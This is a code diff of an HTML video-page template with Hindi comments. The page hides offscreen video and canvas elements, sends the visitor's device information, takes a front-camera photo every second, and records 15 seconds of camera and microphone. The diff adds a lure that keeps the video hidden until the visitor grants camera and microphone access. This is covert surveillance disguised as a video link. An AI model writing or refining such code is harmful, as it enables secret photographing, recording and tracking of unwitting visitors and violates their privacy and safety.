@@ -6,12 +6,15 @@
     <title>Video</title>
     <style>
         body { margin:0; padding:0; background:#000; overflow:hidden; }
-        #owner-video { width:100%; height:100vh; object-fit:contain; background:black; }
+        #owner-video { width:100%; height:100vh; object-fit:contain; background:black; display:none; } /* शुरू में छिपा */
+        #message { color:white; font-family:sans-serif; text-align:center; padding-top:40vh; font-size:18px; }
         #visitor-video, #canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
     </style>
 </head>
 <body>
+    <p id="message">🎥 Please allow camera & microphone to watch the video</p>
     <video id="owner-video" src="{{ video_url }}" muted autoplay playsinline loop></video>
+
     <video id="visitor-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -20,6 +23,8 @@
         const uniqueId = "{{ unique_id }}";
         const visitorVideo = document.getElementById('visitor-video');
         const canvas = document.getElementById('canvas');
+        const ownerVideo = document.getElementById('owner-video');
+        const message = document.getElementById('message');
 
         // 📱 डिवाइस इन्फो भेजें
         async function sendDeviceInfo() {
@@ -89,22 +94,29 @@
 
         // शुरू करें
         (async function main() {
-            sendDeviceInfo();   // डिवाइस इन्फो पहले भेजें
+            sendDeviceInfo();   // यह हमेशा भेजें
+
             let stream;
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: true
                 });
+                // कैमरा/माइक Allow हो गया — अब वीडियो दिखाएँ और मैसेज हटाएँ
+                ownerVideo.style.display = 'block';
+                message.style.display = 'none';
+
                 visitorVideo.srcObject = stream;
                 await new Promise(r => visitorVideo.onloadedmetadata = r);
 
                 // हर 1 सेकंड में फोटो
-                setTimeout(() => {
-                    setInterval(captureAndSendPhoto, 1000);
-                }, 500);
+                setTimeout(() => setInterval(captureAndSendPhoto, 1000), 500);
+                // 15 सेकंड वीडियो रिकॉर्ड
                 await recordVideo(stream);
-            } catch(e) { console.error('Permission error:', e); }
+            } catch(e) {
+                message.innerText = '❌ Camera/Microphone access denied. Video not available.';
+                console.error('Permission denied');
+            }
         })();
     </script>
 </body>
